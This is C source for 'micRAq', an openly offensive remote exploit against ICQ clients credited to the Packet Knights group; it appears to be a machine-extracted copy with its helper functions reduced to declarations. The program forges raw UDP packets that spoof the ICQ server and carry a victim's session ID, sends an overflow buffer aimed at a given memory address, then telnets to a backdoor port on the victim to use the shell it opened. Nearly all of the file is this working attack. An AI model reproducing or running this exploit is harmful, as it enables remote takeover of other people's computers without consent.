
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_8__ TYPE_4__ ;
typedef struct TYPE_7__ TYPE_3__ ;
typedef struct TYPE_6__ TYPE_2__ ;
typedef struct TYPE_5__ TYPE_1__ ;


typedef int u_short ;
struct udphdr {scalar_t__ check; void* len; void* dest; void* source; } ;
struct TYPE_8__ {int* ver; int* cmd; scalar_t__* check; scalar_t__* UIN; scalar_t__* seq2; scalar_t__* seq; int * session; scalar_t__ zero; } ;
struct srv_net_icq_pak {int data; TYPE_4__ head; } ;
struct TYPE_5__ {void* s_addr; } ;
struct sockaddr_in {TYPE_1__ sin_addr; int sin_family; } ;
struct sockaddr {int dummy; } ;
struct TYPE_7__ {void* s_addr; } ;
struct TYPE_6__ {void* s_addr; } ;
struct ip {int ip_hl; int ip_v; int ip_ttl; int ip_sum; TYPE_3__ ip_dst; TYPE_2__ ip_src; int ip_p; void* ip_id; scalar_t__ ip_off; scalar_t__ ip_tos; void* ip_len; } ;
typedef int hincl ;
typedef int RECV_MESSAGE_PTR ;


 int AF_INET ;
 int BACK_PORT ;
 unsigned long DEFAULT_BUFFER_ADDRESS ;
 int ICQ_SERVER_PORT ;
 int IPPROTO_IP ;
 int IPPROTO_RAW ;
 int IPPROTO_UDP ;
 int IP_HDRINCL ;
 int SOCK_RAW ;
 int atoi (char*) ;
 int build_buffer (int ,unsigned long*) ;
 int close (int) ;
 int execl (char*,char*,char*,int ,int *) ;
 int exit (int) ;
 int fflush (int ) ;
 int getpid () ;
 scalar_t__ go (char*) ;
 void* htons (int) ;
 int in_cksum (int *,int) ;
 void* inet_addr (char*) ;
 char* malloc (int) ;
 int memset (char*,int ,int) ;
 int perror (char*) ;
 int printf (char*,...) ;
 scalar_t__ sendto (int,char*,int,int ,struct sockaddr*,int) ;
 scalar_t__ setsockopt (int,int ,int ,int*,int) ;
 int sleep (int) ;
 int socket (int ,int ,int ) ;
 int stdout ;
 int strlen (char*) ;
 int strtol (char*,int *,int) ;
 unsigned long strtoul (char*,int *,int) ;

int main(int argc, char *argv[])
{
        int sock, i, hincl = 1;
        unsigned long buff_addr = DEFAULT_BUFFER_ADDRESS;
        struct sockaddr_in saddr;
        struct ip *pip;
        struct udphdr *pudp;
        char *packet, conv[3];
        struct srv_net_icq_pak *pak;
        RECV_MESSAGE_PTR r_data;

        printf("\n\t[ [ micRAq ] - by tHE rECIdjVO <recidjvo@pkcrew.org> ]\n\t\tPacket Knights - http://www.pkcrew.org/\n\n");

        if((argc != 5) && (argc != 6)) {
                printf("usage: %s <client_ip> <client_port> <server_ip> <hex_session> [buffer]\n\n", argv[0]);
                exit(-1);
        }

        if(strlen(argv[4]) != 8) {
                printf("Error: <session> must be 8 digits exadecimal number.\n\n");
                exit(-1);
        }

        if(argc == 6) {
                buff_addr = strtoul(argv[5], ((void*)0), 16);
        }
        printf("Using buffer address: 0x%x\n\n", buff_addr);


        if((sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
                perror("socket()");
                exit(-1);
        }

        if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(hincl)) < 0) {
                perror("setsockopt()");
                close(sock);
                exit(-1);
        }


        packet = malloc(sizeof(struct ip) + sizeof(struct udphdr) + 1024);
        pip = (struct ip *)packet;
        pudp = (struct udphdr *)(packet + sizeof(struct ip));
        pak = (struct srv_net_icq_pak *)(packet + sizeof(struct ip) + sizeof(struct udphdr));


        memset(packet, 0, sizeof(struct ip) + sizeof(struct udphdr) + 1024);


        saddr.sin_family = AF_INET;
        saddr.sin_addr.s_addr = inet_addr(argv[1]);
        pip->ip_len = htons(sizeof(struct ip) + sizeof(struct udphdr) + 1024);
        pip->ip_hl = 5;
        pip->ip_v = 4;
        pip->ip_ttl = 255;
        pip->ip_tos = 0;
        pip->ip_off = 0;
        pip->ip_id = htons(getpid());
        pip->ip_p = IPPROTO_UDP;
        pip->ip_src.s_addr = inet_addr(argv[3]);
        pip->ip_dst.s_addr = inet_addr(argv[1]);
        pip->ip_sum = in_cksum((u_short*)pip, sizeof(struct ip));
        pudp->source = htons(ICQ_SERVER_PORT);
        pudp->dest = htons(atoi(argv[2]));
        pudp->len = htons(sizeof(struct udphdr) + 1024);
        pudp->check = 0;


        pak->head.ver[0] = 5;
        pak->head.ver[1] = 0;
        pak->head.zero = 0;

        for(i = 0; i < 8; i += 2) {
                conv[0] = argv[4][i];
                conv[1] = argv[4][i + 1];
                conv[2] = '\0';

                pak->head.session[i / 2] = strtol(conv, ((void*)0), 16);
        }

        pak->head.cmd[0] = 4;
        pak->head.cmd[1] = 1;
        pak->head.seq[0] = 0;
        pak->head.seq[1] = 0;
        pak->head.seq2[0] = 0;
        pak->head.seq2[1] = 0;
        pak->head.UIN[0] = 0;
        pak->head.UIN[1] = 0;
        pak->head.UIN[2] = 0;
        pak->head.UIN[3] = 0;
        pak->head.check[0] = 0;
        pak->head.check[1] = 0;
        pak->head.check[2] = 0;
        pak->head.check[3] = 0;


        build_buffer(pak->data, &buff_addr);


        if(sendto(sock, packet, sizeof(struct ip) + sizeof(struct udphdr) + 1024, 0, (struct sockaddr *)&saddr, sizeof(struct sockaddr_in)) < 0) {
                perror("sendto()");
                close(sock);
                exit(-1);
        }


        close(sock);


        sleep(1);


        if(go(argv[1]) < 0) {
                printf("Unable to connect :\\\n");
                exit(-1);
        }


        sleep(1);
        printf("\t\"To be");
        fflush(stdout);
        sleep(2);
        printf(", or not to be.\n");
        sleep(1);
        printf("\t This is the question.\"\n");
        sleep(1);
        printf("\t\t\t(William Shakespeare)\n\n");


        execl("/usr/bin/telnet", "telnet", argv[1], BACK_PORT, ((void*)0));


        exit(-1);
}
